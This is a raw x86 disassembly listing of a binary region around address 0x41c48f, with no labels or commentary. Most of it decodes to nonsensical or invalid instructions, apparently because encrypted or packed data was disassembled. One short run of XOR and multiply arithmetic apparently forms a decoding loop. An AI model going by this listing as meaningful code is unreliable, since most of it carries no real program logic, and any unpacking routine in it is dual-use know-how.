  41c48f:	sbb    BYTE PTR [ebx-0x40],0x34
  41c493:	pushf  
  41c494:	jl     0x41c430
  41c496:	mov    BYTE PTR [esi-0x21e82587],cl
  41c49c:	and    ebx,DWORD PTR [ebx+0x68]
  41c49f:	dec    ebx
  41c4a0:	(bad)
  41c4a5:	inc    esi
  41c4a6:	sahf   
  41c4a7:	and    edi,edx
  41c4a9:	cdq    
  41c4aa:	loop   0x41c4fa
  41c4ac:	mov    dl,0x2b
  41c4ae:	ret    0xc50a
  41c4b1:	das    
  41c4b2:	xchg   DWORD PTR cs:[edx],edi
  41c4b5:	xchg   BYTE PTR [ebp+0x1a],bh
  41c4b8:	dec    eax
  41c4b9:	repz iret 
  41c4bb:	dec    ecx
  41c4bc:	into   
  41c4bd:	ficom  WORD PTR [ebx+0x2e]
  41c4c0:	jae    0x41c527
  41c4c2:	adc    al,0x1e
  41c4c4:	ss cmp al,0x94
  41c4c7:	fcom   QWORD PTR [ebx-0x2e4dc275]
  41c4cd:	ror    DWORD PTR [ecx+0x39537ba1],1
  41c4d3:	pushw  es
  41c4d5:	(bad)  
  41c4d6:	ins    BYTE PTR es:[edi],dx
  41c4d7:	(bad)  
  41c4d8:	data16 sub BYTE PTR [edi-0x79f9e0ae],cl
  41c4df:	sbb    edi,DWORD PTR [edx+0x2b385118]
  41c4e5:	clc    
  41c4e6:	pop    ebx
  41c4e7:	and    BYTE PTR [ebx],dh
  41c4e9:	jg     0x41c482
  41c4eb:	inc    esi
  41c4ec:	adc    eax,0x6119d323
  41c4f1:	popa   
  41c4f2:	std    
  41c4f3:	repnz pop ebp
  41c4f5:	rcr    DWORD PTR [ebx],cl
  41c4f7:	scas   eax,DWORD PTR es:[edi]
  41c4f8:	cdq    
  41c4f9:	cmc    
  41c4fa:	add    DWORD PTR [esp+edx*1+0xab9877a],0x79410767
  41c505:	sbb    eax,0x85b015a5
  41c50a:	xchg   esp,eax
  41c50b:	stc    
  41c50c:	sub    BYTE PTR [si+0x2ce4],ch
  41c511:	push   es
  41c512:	or     al,0x59
  41c514:	or     DWORD PTR [edx+edi*8-0x3b],esp
  41c518:	ins    BYTE PTR es:[edi],dx
  41c519:	push   ecx
  41c51a:	scas   al,BYTE PTR es:[edi]
  41c51b:	push   edi
  41c51c:	xchg   ebp,eax
  41c51d:	gs ja  0x41c59f
  41c520:	cs stos DWORD PTR es:[edi],eax
  41c522:	rol    BYTE PTR [ebx+0x54],1
  41c525:	add    BYTE PTR [ebp+ebx*8-0x5f],0x9
  41c52a:	dec    eax
  41c52b:	adc    esp,DWORD PTR [ebp+0x5fbd07df]
  41c531:	in     al,0x50
  41c533:	mov    bh,BYTE PTR [ebx+eax*4-0x603d1c78]
  41c53a:	jb     0x41c543
  41c53c:	pushf  
  41c53d:	mov    edx,DWORD PTR [eax+0x649fb643]
  41c543:	push   ebx
  41c544:	hlt    
  41c545:	imul   edx,DWORD PTR [ebp+ebp*4+0xf703609],0x1bc00359
  41c550:	arpl   WORD PTR [edi],ax
  41c552:	in     ax,dx
  41c554:	ror    BYTE PTR [ecx+0x47],cl
  41c557:	mov    edx,0x9474ec5f
  41c55c:	mov    ah,0x86
  41c55e:	xchg   ebx,edi
  41c560:	dec    ecx
  41c561:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c562:	mov    ds:0xaabf5071,eax
  41c567:	fdivrp st(1),st
  41c569:	jno    0x41c5e1
  41c56b:	in     al,0x37
  41c56d:	pop    ss
  41c56e:	sbb    eax,0x25ddab4f
  41c573:	mov    ch,0xdf
  41c575:	push   0x5b4ba615
  41c57a:	cwde   
  41c57b:	adc    eax,0xc39339ec
  41c581:	(bad)  
  41c582:	push   edx
  41c583:	xor    ecx,eax
  41c585:	xor    edx,eax
  41c587:	sub    ecx,edx
  41c589:	sub    ecx,esi
  41c58b:	xor    ecx,eax
  41c58d:	mov    DWORD PTR [ebp+0x8],ecx
  41c590:	mov    ecx,DWORD PTR [ebp+0x8]
  41c593:	mov    edx,DWORD PTR [ebp+0x8]
  41c596:	xor    ecx,eax
  41c598:	imul   edx,edx,0x5708f2
  41c59e:	add    ecx,esi
  41c5a0:	lea    ecx,[ebp+ecx*4-0x64]
  41c5a4:	mov    edi,DWORD PTR [ecx]
  41c5a6:	add    edx,edi
  41c5a8:	mov    DWORD PTR [ecx],edx
  41c5aa:	mov    ecx,DWORD PTR [ebp+0x8]
  41c5ad:	xor    ecx,eax
  41c5af:	add    ecx,esi
  41c5b1:	jne    0x41a1f0
  41c5b7:	mov    ecx,DWORD PTR [ebp-0x14]
  41c5ba:	mov    edx,DWORD PTR [ebp+0x8]
  41c5bd:	xor    ecx,eax
  41c5bf:	jmp    0x41e94c
  41c5c4:	js     0x41c5e5
  41c5c6:	pop    ebx
  41c5c7:	out    0xdb,eax
  41c5c9:	jnp    0x41c643
  41c5cb:	rep ins DWORD PTR es:[edi],dx
  41c5cd:	pop    ebx
  41c5ce:	jns    0x41c591
  41c5d0:	mov    al,0xfe
  41c5d2:	fmul   st(2),st
  41c5d4:	(bad)  
  41c5d5:	loope  0x41c654
  41c5d7:	jp     0x41c5e3
  41c5d9:	pop    edi
  41c5da:	jp     0x41c656
  41c5dc:	shl    BYTE PTR [ebx-0x47d9e5cd],cl
  41c5e2:	mov    WORD PTR [eax],ds
  41c5e4:	mov    esp,0x6785e53b
  41c5e9:	fadd   DWORD PTR [ebx-0x14]
  41c5ec:	(bad)  
  41c5ed:	dec    esp
  41c5ee:	xchg   ecx,eax
  41c5ef:	and    ecx,0x31
  41c5f2:	push   ss
  41c5f3:	test   BYTE PTR [ebx],ch
  41c5f5:	mov    ebp,0x9ac9a8fe
  41c5fa:	inc    ecx
  41c5fb:	ss jbe 0x41c5c6
  41c5fe:	fbld   TBYTE PTR [esi+0x31]
  41c601:	xchg   ebp,eax
  41c602:	xchg   esi,eax
  41c603:	pop    ecx
  41c604:	or     al,0xf6
  41c606:	fs xchg edi,eax
  41c608:	mov    edx,es
  41c60a:	dec    ecx
  41c60b:	sahf   
  41c60c:	push   ss
  41c60d:	clc    
  41c60e:	out    dx,al
  41c60f:	pusha  
  41c610:	sahf   
  41c611:	mov    ds:0xe0a06ff7,al
  41c616:	sbb    eax,0x7d1e3bd8
  41c61b:	out    dx,al
  41c61c:	idiv   BYTE PTR [eax+ebp*8+0x20a8a9d7]
  41c623:	mov    ebp,ebp
  41c625:	rcl    DWORD PTR [edx+0x14],0x5a
  41c629:	ret    
  41c62a:	add    BYTE PTR [edx+edx*8-0xc],0x4f
  41c62f:	or     eax,DWORD PTR [ecx-0x75]
  41c632:	push   esi
  41c633:	fstp   DWORD PTR [eax]
  41c635:	pop    edi
  41c636:	sub    al,0x23
  41c638:	and    ah,0x6f
  41c63b:	push   0xa5655aa9
  41c640:	dec    ebp
  41c641:	mov    BYTE PTR [ebx],dh
  41c643:	jo     0x41c5fb
  41c645:	pop    es
  41c646:	call   0x6d3e:0x89a510bd
  41c64d:	loopne 0x41c624
  41c64f:	push   DWORD PTR [ebp+0x1b]
  41c652:	je     0x41c6b3
  41c654:	inc    bh
  41c656:	call   0x655c13ea
  41c65b:	ins    DWORD PTR es:[edi],dx
  41c65c:	sbb    dl,BYTE PTR [edx-0x619edd8e]
  41c662:	aam    0x82
  41c664:	test   al,0x94
  41c666:	dec    ecx
  41c667:	xchg   edx,eax
  41c668:	adc    al,0x23
  41c66a:	or     DWORD PTR [eax-0x3b],eax
  41c66d:	inc    esi
  41c66e:	pop    ecx
  41c66f:	dec    eax
  41c670:	jmp    0xe5071bb6
  41c675:	hlt    
  41c676:	push   ecx
  41c677:	xchg   ebp,eax
  41c678:	sbb    al,0xe6
  41c67a:	test   esp,ebp
  41c67c:	aas    
  41c67d:	mov    edi,0x32b10828
  41c682:	adc    esi,DWORD PTR ds:0xbe42e231
  41c688:	adc    edi,DWORD PTR [edi-0x21b8d258]
  41c68e:	and    al,0xa7
  41c690:	inc    ebp
  41c691:	mov    dl,0xa2
  41c693:	aaa    
  41c694:	cwde   
  41c695:	aam    0x4e
  41c697:	adc    al,0xc9
  41c699:	iret   
  41c69a:	(bad)  
  41c69b:	loopne 0x41c698
  41c69d:	ss pop esi
  41c69f:	pusha  
  41c6a0:	pop    ebx
  41c6a1:	push   cs
  41c6a2:	push   ebx
  41c6a3:	mov    ebp,0x10557d33
  41c6a8:	inc    edx
  41c6a9:	mov    es,WORD PTR [eax-0x28a4e185]
  41c6af:	push   ebp
  41c6b0:	ja     0x41c67b
  41c6b2:	cld    
  41c6b3:	pop    ss
  41c6b4:	adc    dl,dh
  41c6b6:	jp     0x41c706
  41c6b8:	cmp    eax,ecx
  41c6ba:	cmp    ecx,ecx
  41c6bc:	jp     0x41c701
  41c6be:	mov    ebx,0x8d1e05f8
  41c6c3:	dec    ebp
  41c6c4:	pushf  
  41c6c5:	push   esp
  41c6c6:	iret   
  41c6c7:	retf   0x9a2f
  41c6ca:	call   edi
  41c6cc:	shr    BYTE PTR [edi+0x9],cl
  41c6cf:	xchg   esp,eax
  41c6d0:	adc    al,0xac
  41c6d2:	inc    esi
  41c6d3:	pop    ss
  41c6d4:	inc    edx
  41c6d5:	sbb    al,0x31
  41c6d7:	leave  
  41c6d8:	mov    DWORD PTR [ecx-0x36043d76],esp
  41c6de:	inc    ecx
  41c6df:	jnp    0x41c745
  41c6e1:	jmp    0x41c70b
  41c6e3:	or     DWORD PTR [ebx+0x2bb0fc97],ebp
  41c6e9:	fsubr  QWORD PTR [eax]
  41c6eb:	scas   eax,DWORD PTR es:[edi]
  41c6ec:	(bad)  
  41c6ed:	mov    bh,0xb6
  41c6ef:	jge    0x41c746
  41c6f1:	xor    al,0x31
  41c6f3:	adc    eax,DWORD PTR [ebx-0x47]
  41c6f6:	mov    DWORD PTR [eax+0x57],esi
  41c6f9:	push   ebp
  41c6fa:	xor    DWORD PTR [ebp-0x12],0xffffffd3
  41c6fe:	fwait
  41c6ff:	add    DWORD PTR [ebp+eax*4-0x5],eax
  41c703:	into   
  41c704:	fdiv   QWORD PTR [eax+0x5a157c2f]
  41c70a:	inc    edi
  41c70b:	test   DWORD PTR [ebx+0x2b],ebp
  41c70e:	test   eax,0x5c253de3
  41c713:	(bad)  
  41c715:	xchg   ebx,eax
  41c716:	dec    esp
  41c717:	int    0xca
  41c719:	cmp    al,BYTE PTR [eax+0x29bd1607]
  41c71f:	repz xlat BYTE PTR ds:[ebx]
  41c721:	mov    edi,edx
  41c723:	mov    ds:0xd4c4c2f5,eax
  41c728:	lods   eax,DWORD PTR ds:[esi]
  41c729:	(bad)  
  41c72a:	in     eax,dx
  41c72b:	fldz   
  41c72d:	and    eax,0x77174837
  41c732:	adc    al,0x67
  41c734:	call   0xbdc:0xb06d22f6
  41c73b:	int    0xf6
  41c73d:	int3   
  41c73e:	test   eax,ecx
  41c740:	mov    al,0x0
  41c742:	sub    DWORD PTR [esi-0x49],eax
  41c745:	lds    eax,FWORD PTR [edx-0x10e3336b]
  41c74b:	pop    ss
  41c74c:	inc    ebx
  41c74d:	xchg   ebp,eax
  41c74e:	dec    edi
  41c74f:	inc    ebp
  41c750:	ds jns 0x41c75f
  41c753:	out    dx,eax
  41c754:	push   eax
  41c755:	pop    edx
  41c756:	ret    0x3ec1
  41c759:	in     al,dx
  41c75a:	cmps   BYTE PTR ds:[si],BYTE PTR es:[di]
  41c75c:	push   esp
  41c75d:	(bad)  
  41c75f:	mov    gs,ebp
  41c761:	icebp  
  41c762:	and    DWORD PTR [edi],ebp
  41c764:	xor    DWORD PTR [edx+edi*1+0x144210ef],esp
  41c76b:	loope  0x41c746
  41c76d:	pop    ebp
  41c76e:	popa   
  41c76f:	fs scas eax,DWORD PTR es:[edi]
  41c771:	in     al,0xd2
  41c773:	mov    eax,0xfe319b1f
  41c778:	pop    ebx
  41c779:	es mov cl,bl
  41c77c:	jbe    0x41c7b0
  41c77e:	and    BYTE PTR [ecx+0x2e0725dc],al
  41c784:	mov    DWORD PTR [eax+0x6d2c9978],esi
  41c78a:	mov    ebp,0xa31cba58
  41c78f:	sub    al,0x99
  41c791:	in     al,dx
  41c792:	or     cl,BYTE PTR [edx-0x2654ae72]
  41c798:	and    al,0x13
  41c79a:	add    BYTE PTR [ebp+ecx*4-0x78],0x4
  41c79f:	fisubr DWORD PTR [eax+eiz*2]
  41c7a2:	aam    0x42
  41c7a4:	push   edi
  41c7a5:	dec    al
  41c7a7:	fcom   st(0)
  41c7a9:	arpl   ax,bx
  41c7ab:	popa   
  41c7ac:	sbb    eax,0xcb532fac
  41c7b1:	lock gs repnz xchg ecx,eax
  41c7b5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c7b6:	jno    0x41c791
  41c7b8:	inc    edi
  41c7b9:	inc    edx
  41c7ba:	dec    esp
  41c7bb:	jns    0x41c803
  41c7bd:	adc    BYTE PTR [ebx+0x58816ed6],0x5e
  41c7c4:	icebp  
  41c7c5:	dec    ebx
  41c7c6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c7c7:	cmp    eax,0x722269fc
  41c7cc:	in     eax,0x8c
  41c7ce:	ss mov dh,0x5e
  41c7d1:	pop    ecx
  41c7d2:	lods   al,BYTE PTR ds:[esi]
  41c7d3:	cwde   
  41c7d4:	push   edi
  41c7d5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c7d6:	popf   
  41c7d7:	adc    eax,0xeda79c40
  41c7dc:	ins    DWORD PTR es:[edi],dx
  41c7dd:	pop    edi
  41c7de:	add    DWORD PTR [ebp-0xc0d5f7f],ecx
  41c7e4:	pop    edi
  41c7e5:	addr16 xchg esp,eax
  41c7e7:	jmp    0xf3c0:0xb7440947
  41c7ee:	sub    BYTE PTR [ebp+0x3fb11364],ah
  41c7f4:	jmp    0x41c80d
  41c7f6:	mov    edx,0xfea8b49f
  41c7fb:	mov    al,0x6a
  41c7fd:	fs jle 0x41c846
  41c800:	sub    al,BYTE PTR [ebx]
  41c802:	cmp    eax,0x8b1f9d4a
  41c807:	mov    esp,0x7be3e97b
  41c80c:	inc    edx
  41c80d:	sbb    cl,bh
  41c80f:	dec    ecx
  41c810:	ds mov ebx,0xce42b1da
  41c816:	lds    edi,FWORD PTR [ebp+0x1e]
  41c819:	mov    al,ds:0x4119e001
  41c81e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c81f:	mov    DWORD PTR [ecx-0x7eed2361],ebx
  41c825:	aas    
  41c826:	mov    bl,0x6b
  41c828:	mov    ebp,0x7ef92248
  41c82d:	mov    es,WORD PTR ds:0x79c2fffb
  41c833:	dec    eax
  41c834:	ror    edx,0xab
  41c837:	out    dx,eax
  41c838:	push   0xff1e9a0a
  41c83d:	jae    0x41c7e1
  41c83f:	mov    ds:0x79a0bd49,eax
  41c844:	pop    ebx
  41c845:	dec    ebp
  41c846:	dec    esp
  41c847:	mov    BYTE PTR [ebx+0x4f1b7b22],ch
  41c84d:	push   0x7f
  41c84f:	cmp    al,0xc4
  41c851:	xchg   esi,eax
  41c852:	es and al,0xa9
  41c855:	push   cs
  41c856:	in     al,dx
  41c857:	mov    esi,0x14d32e7
  41c85c:	or     BYTE PTR [ebp+0x70937984],dl
  41c862:	fs push esi
  41c864:	or     DWORD PTR [ecx-0x24],esp
  41c867:	add    eax,0xedabc5c
  41c86c:	mov    ebx,0xb9b78ecb
  41c871:	jnp    0x41c875
  41c873:	outs   dx,BYTE PTR ds:[esi]
  41c874:	mov    esi,0xa1757ad0
  41c879:	push   ebp
  41c87a:	mov    esp,0x54a3d9d7
  41c87f:	mov    bl,0xcb
  41c881:	pop    eax
  41c882:	fidivr DWORD PTR ds:0xd41e012f
  41c888:	mov    ds:0xcb85ab6e,eax
  41c88d:	add    BYTE PTR [esi],ch
  41c88f:	inc    edx
  41c890:	repz adc al,BYTE PTR fs:[esi-0x4e]
  41c895:	sub    al,0xfa
  41c897:	xor    eax,0x9c64c754
  41c89c:	out    dx,al
  41c89d:	push   edx
  41c89e:	xor    ch,ah
  41c8a0:	jge    0x41c86c
  41c8a2:	mov    edx,0x840eee93
  41c8a7:	inc    ebp
  41c8a8:	inc    esp
  41c8a9:	jnp    0x41c923
  41c8ab:	iret   
  41c8ac:	xchg   edx,eax
  41c8ad:	xor    BYTE PTR [ecx],0x9f
  41c8b0:	pop    eax
  41c8b1:	in     eax,0xc9
  41c8b3:	test   DWORD PTR [ebp+0x209b4295],ecx
  41c8b9:	fcom   QWORD PTR [ebp-0x68]
  41c8bc:	pop    esi
  41c8bd:	sbb    DWORD PTR [ecx],ebp
  41c8bf:	push   ds
  41c8c0:	lea    edx,[edi+0x65]
  41c8c3:	ror    BYTE PTR [edi+0x2c],1
  41c8c6:	adc    BYTE PTR [ebx-0x45b48b27],0xc5
  41c8cd:	xchg   esi,eax
  41c8ce:	mov    BYTE PTR ds:0x98f4f138,dh
  41c8d4:	and    al,0x4f
  41c8d6:	xchg   ebp,eax
  41c8d7:	pushf  
  41c8d8:	lods   al,BYTE PTR ds:[esi]
  41c8d9:	pop    ebp
  41c8da:	popa   
  41c8db:	int3   
  41c8dc:	and    eax,0x54a7a3ec
  41c8e1:	iret   
  41c8e2:	data16 mov BYTE PTR [ebx-0x4e],dh
  41c8e6:	jnp    0x41c8a0
  41c8e8:	xlat   BYTE PTR ds:[ebx]
  41c8e9:	add    eax,0x16c6f0ce
  41c8ee:	or     al,0xfb
  41c8f0:	pop    eax
  41c8f1:	nop
  41c8f2:	xchg   edx,eax
  41c8f3:	mov    ah,0x44
  41c8f5:	retf   
  41c8f6:	jecxz  0x41c943
  41c8f8:	jge    0x41c8ce
  41c8fa:	fmul   st,st(4)
  41c8fc:	cmp    edi,DWORD PTR [edx+ebx*4-0x44]
  41c900:	mov    ebx,0x1114bab7
  41c905:	xchg   DWORD PTR [esi+esi*2],ebx
  41c908:	sub    cl,BYTE PTR [ebp-0x42ce4f03]
  41c90e:	xor    DWORD PTR [eax+0x12],ebp
  41c911:	mov    ebx,0xc255dd7e
  41c916:	dec    edx
  41c917:	mov    eax,0x15f2baa3
  41c91c:	xchg   DWORD PTR [edx],esp
  41c91e:	or     edx,DWORD PTR [esi+esi*2-0x403d2fff]
  41c925:	cmc    
  41c926:	(bad)  
  41c927:	jb     0x41c984
  41c929:	dec    ecx
  41c92a:	jg     0x41c9a7
  41c92c:	adc    dl,ch
  41c92e:	jbe    0x41c8ca
  41c930:	mov    ecx,0x60cbc61a
  41c935:	mov    ah,0xd7
  41c937:	ins    BYTE PTR es:[edi],dx
  41c938:	or     al,BYTE PTR [ebx+0x73ae5b72]
  41c93e:	inc    edx
  41c93f:	repnz push esp
  41c941:	push   edx
  41c942:	sbb    DWORD PTR [esp+ebx*8],0x1c
  41c946:	cwde   
  41c947:	out    0x4e,al
  41c949:	call   0xf5693cee
  41c94e:	in     al,dx
  41c94f:	and    BYTE PTR [ecx+ecx*1+0x28],bl
  41c953:	or     ebx,DWORD PTR [ecx+edi*8-0x292e5326]
  41c95a:	aad    0x54
  41c95c:	rcl    ebx,1
  41c95e:	test   BYTE PTR [esi+0x44],ah
  41c961:	push   edx
  41c962:	outs   dx,DWORD PTR ds:[esi]
  41c963:	push   es
  41c964:	dec    esi
  41c965:	mov    BYTE PTR [eax+0x54],bh
  41c968:	dec    ecx
  41c969:	ja     0x41c981
  41c96b:	into   
  41c96c:	aas    
  41c96d:	jge    0x41c927
  41c96f:	jbe    0x41c9ea
  41c971:	std    
  41c972:	jae    0x41c9a9
  41c974:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c975:	ss pop es
  41c977:	int    0xb5
  41c979:	xchg   edi,eax
  41c97a:	(bad)  
  41c97b:	arpl   WORD PTR [edi+0x11eb931c],bp
  41c981:	enter  0x3858,0x10
  41c985:	cdq    
  41c986:	mov    esi,0xa468926
  41c98b:	mov    DWORD PTR [edi-0x56],0x51ecc173
  41c992:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c993:	jge    0x41c9d1
  41c995:	adc    BYTE PTR ds:0x1ae03267,al
  41c99b:	loopne 0x41c9b8
  41c99d:	fild   WORD PTR [esi+0x5865a03c]
  41c9a3:	out    dx,eax
  41c9a4:	repnz cwde 
  41c9a6:	cmp    BYTE PTR [ebx+0x5eaa9193],al
  41c9ac:	ins    BYTE PTR es:[edi],dx
  41c9ad:	mov    WORD PTR [edx+esi*2+0x27],es
  41c9b1:	and    dl,BYTE PTR [ecx-0x6d]
  41c9b4:	jb     0x41ca18
  41c9b6:	pop    ebx
  41c9b7:	test   al,al
  41c9b9:	or     cl,BYTE PTR [esi]
  41c9bb:	arpl   WORD PTR [ebx],di
  41c9bd:	push   esi
  41c9be:	(bad)  
  41c9bf:	cmc    
  41c9c0:	enter  0x325d,0xae
  41c9c4:	xchg   ch,al
  41c9c6:	and    eax,0xe2643f11
  41c9cb:	mov    bl,0xa9
  41c9cd:	and    al,0x15
  41c9cf:	sub    DWORD PTR [ecx-0x247ec00],esi
  41c9d5:	daa    
  41c9d6:	(bad)  
  41c9d7:	mov    al,0x15
  41c9d9:	int    0x7d
  41c9db:	int3   
  41c9dc:	xchg   BYTE PTR ds:0x57de567,bh
  41c9e2:	jmp    0xd1afb8a
  41c9e7:	lods   eax,DWORD PTR ds:[esi]
  41c9e8:	clc    
  41c9e9:	mov    bl,0x73
  41c9eb:	mov    edi,0xaf06eb4d
  41c9f0:	rcl    BYTE PTR [ecx+edx*4+0x9],1
  41c9f4:	nop
  41c9f5:	call   0xe32fdb4a
  41c9fa:	in     eax,0xe5
  41c9fc:	pop    ss
  41c9fd:	fisubr DWORD PTR [eax-0x54b6ae30]
  41ca03:	xchg   edi,eax
  41ca04:	adc    DWORD PTR [edx+0x2b548b5d],eax
  41ca0a:	retf   
  41ca0b:	dec    eax
  41ca0c:	cmp    edi,DWORD PTR [esp+0x7f]
  41ca10:	ja     0x41ca4a
  41ca12:	enter  0x4c42,0x34
  41ca16:	popf   
  41ca17:	ins    DWORD PTR es:[edi],dx
  41ca18:	jne    0x41c9a9
  41ca1a:	push   eax
  41ca1b:	loop   0x41c9e3
  41ca1d:	adc    edx,edx
  41ca1f:	es std 
  41ca21:	ja     0x41ca72
  41ca23:	and    BYTE PTR [ebp+0x14],dh
  41ca26:	iret   
  41ca27:	or     al,0x9c
  41ca29:	dec    esp
  41ca2a:	push   es
  41ca2b:	(bad)  
  41ca2c:	dec    ecx
  41ca2d:	je     0x41ca34
  41ca2f:	push   ebx
  41ca30:	jne    0x41ca28
  41ca32:	(bad)  
  41ca33:	enter  0x7fbc,0xb9
  41ca37:	cmc    
  41ca38:	pop    ecx
  41ca39:	aad    0x35
  41ca3b:	jle    0x41ca69
  41ca3d:	cmp    edi,esi
  41ca3f:	aas    
  41ca40:	pop    edx
  41ca41:	aam    0xd4
  41ca43:	and    cl,bh
  41ca45:	shr    BYTE PTR [ecx],0x48
  41ca48:	xchg   ebx,eax
  41ca49:	push   ds
  41ca4a:	mov    ds:0xfd3bcee9,eax
  41ca4f:	mov    dl,0xe8
  41ca51:	nop
  41ca52:	mov    bh,0x3
  41ca54:	xlat   BYTE PTR ds:[ebx]
  41ca55:	xor    DWORD PTR [eax-0x63b479da],esi
  41ca5b:	xor    ebx,DWORD PTR [ebx-0x5edd8520]
  41ca61:	adc    bl,BYTE PTR [ebp-0x64ad0492]
  41ca67:	repz and BYTE PTR [bx+0x49],al
  41ca6c:	and    al,BYTE PTR [esi]
  41ca6e:	mov    ebx,0x2d339aa3
  41ca73:	push   esi
  41ca74:	scas   al,BYTE PTR es:[edi]
  41ca75:	lds    ecx,FWORD PTR [ecx+0x37b595c8]
  41ca7b:	scas   eax,DWORD PTR es:[edi]
  41ca7c:	sbb    al,0xca
  41ca7e:	pop    ecx
  41ca7f:	push   ebx
  41ca80:	and    DWORD PTR [eax],ebx
  41ca82:	jmp    0x9fb5:0xb0a9d06
  41ca89:	jle    0x41ca14
  41ca8b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ca8c:	rol    DWORD PTR [eax+ecx*1],cl
  41ca8f:	push   0x11
  41ca91:	imul   ebp,DWORD PTR [eax+ecx*4],0x67
  41ca95:	dec    ebp
  41ca96:	dec    ecx
  41ca97:	iret   
  41ca98:	xor    DWORD PTR [edx+0x14684956],ebx
  41ca9e:	add    ebp,DWORD PTR [eax+ecx*4]
  41caa1:	inc    esi
  41caa2:	push   edx
  41caa3:	cmp    ebp,DWORD PTR [edx-0x70]
  41caa6:	repnz sar ebp,cl
  41caa9:	push   es
  41caaa:	aam    0x71
  41caac:	mov    ss,WORD PTR ds:0x2070ddbc
  41cab2:	sti    
  41cab3:	mov    cl,0x6c
  41cab5:	jmp    0x41ca76
  41cab7:	add    eax,DWORD PTR [ecx+0x6835422c]
  41cabd:	xchg   ecx,eax
  41cabe:	mov    edx,0xa547ab49
  41cac3:	or     ch,bh
  41cac5:	stos   BYTE PTR es:[edi],al
  41cac6:	sbb    al,0xf4
  41cac8:	add    eax,0x84970020
  41cacd:	pop    ds
  41cace:	jg     0x41ca93
  41cad0:	fwait
  41cad1:	xor    BYTE PTR [edx+0x42],0xa2
  41cad5:	inc    ebp
  41cad6:	fistp  DWORD PTR [ecx+0x5]
  41cad9:	sbb    al,0xc5
  41cadb:	xor    DWORD PTR [edx+0x6a],0x33
  41cadf:	push   eax
  41cae0:	push   esp
  41cae1:	mov    edi,DWORD PTR [eax+0x3f]
  41cae4:	cld    
  41cae5:	bound  eax,QWORD PTR ds:0x3ac70b8b
  41caeb:	fcom   DWORD PTR [eax+0x304197d4]
  41caf1:	pop    ds
  41caf2:	les    edx,FWORD PTR [esi-0x22]
  41caf5:	pop    ecx
  41caf6:	rcr    BYTE PTR [ebp+0x20],cl
  41caf9:	aam    0xc2
  41cafb:	sar    BYTE PTR [ecx-0x7],0xdf
  41caff:	xor    bh,BYTE PTR [edx-0x72933565]
  41cb05:	fmul   st(6),st
  41cb07:	sbb    edi,DWORD PTR ds:0x24f752e5
  41cb0d:	pop    ebp
  41cb0e:	and    al,0x97
  41cb10:	repnz cmp edx,ebx
  41cb13:	scas   al,BYTE PTR es:[edi]
  41cb14:	js     0x41cb48
  41cb16:	cs jmp 0x41cb16
  41cb19:	or     edi,edi
  41cb1b:	adc    edi,DWORD PTR [eax]
  41cb1d:	sub    DWORD PTR [eax+esi*8],ebx
  41cb20:	mov    bl,BYTE PTR [eax+0x428008d6]
  41cb26:	sbb    esp,edi
  41cb28:	popa   
  41cb29:	mov    bl,0x6
  41cb2b:	inc    edi
  41cb2c:	push   edx
  41cb2d:	add    al,0xdc
  41cb2f:	dec    ebp
  41cb30:	lods   eax,DWORD PTR ds:[esi]
  41cb31:	cld    
  41cb32:	out    dx,eax
  41cb33:	fst    DWORD PTR [edi+eax*2-0x6df0b7bc]
  41cb3a:	dec    eax
  41cb3b:	push   edi
  41cb3c:	imul   eax,DWORD PTR gs:[edx+0x6ff18393],0x422845c4
  41cb47:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41cb48:	and    BYTE PTR [edi+0x0],ch
  41cb4b:	lods   al,BYTE PTR ds:[esi]
  41cb4c:	fistp  DWORD PTR [edx+0x656bcc0d]
  41cb52:	push   0x6d959f4a
  41cb57:	jle    0x41cbca
  41cb59:	fsub   QWORD PTR [edi+ebx*4]
  41cb5c:	sbb    eax,0x70960f3d
  41cb61:	cdq    
  41cb62:	jmp    0x59f67a6c
  41cb67:	lock call 0x9f13:0x979d0861
  41cb6f:	in     eax,0x68
  41cb71:	or     eax,esp
  41cb73:	jae    0x41cb21
  41cb75:	rcl    DWORD PTR [ecx-0x42ef011b],cl
  41cb7b:	mov    dl,BYTE PTR [edi-0x1f]
  41cb7e:	repnz cli 
  41cb80:	xchg   esp,eax
  41cb81:	popa   
  41cb82:	dec    ecx
  41cb83:	imul   ebp,ecx,0xffffffb4
  41cb86:	neg    DWORD PTR [esi]
  41cb88:	inc    edi
  41cb89:	jg     0x41cb68
  41cb8b:	cmp    bl,BYTE PTR [ebx+0x3e6c902a]
  41cb91:	shl    DWORD PTR [edx+0x30],1
  41cb94:	fisttp DWORD PTR ds:0xf5669c0b
  41cb9a:	data16 jge 0x41cbbf
  41cb9d:	outs   dx,BYTE PTR ss:[esi]
  41cb9f:	push   0x2f9fc8f6
  41cba4:	(bad)  
  41cba5:	in     eax,dx
  41cba6:	enter  0x4d7b,0xd4
  41cbaa:	sub    edi,esp
  41cbac:	pop    esp
  41cbad:	sahf   
  41cbae:	imul   eax,ecx,0x4c755ca0
  41cbb4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41cbb5:	jmp    0x6fc09375
  41cbba:	in     eax,dx
  41cbbb:	adc    eax,0xbadf4309
  41cbc0:	inc    edx
  41cbc1:	adc    al,0xd2
  41cbc3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41cbc4:	mov    ah,0x2e
  41cbc6:	inc    eax
  41cbc7:	test   edx,edi
  41cbc9:	xor    edx,DWORD PTR [edi+0x579ea996]
  41cbcf:	mov    edi,0x5e5b92bf
  41cbd4:	fstp   TBYTE PTR [eax]
  41cbd6:	pop    edx
  41cbd7:	mov    DWORD PTR [edi+0x5c7bc16c],edx
  41cbdd:	mov    esi,0x8389f45a
  41cbe2:	sub    ah,dl
  41cbe4:	fs jnp 0x41cc18
  41cbe7:	jmp    0x483a5868
  41cbec:	leave  
  41cbed:	sti    
  41cbee:	add    eax,0x2e38844a
  41cbf3:	sbb    dl,BYTE PTR [esi-0x76ee10da]
  41cbf9:	cmp    DWORD PTR [esi-0x661c54b7],ebp
  41cbff:	xchg   esi,eax
  41cc00:	scas   al,BYTE PTR es:[edi]
  41cc01:	sbb    edx,edx
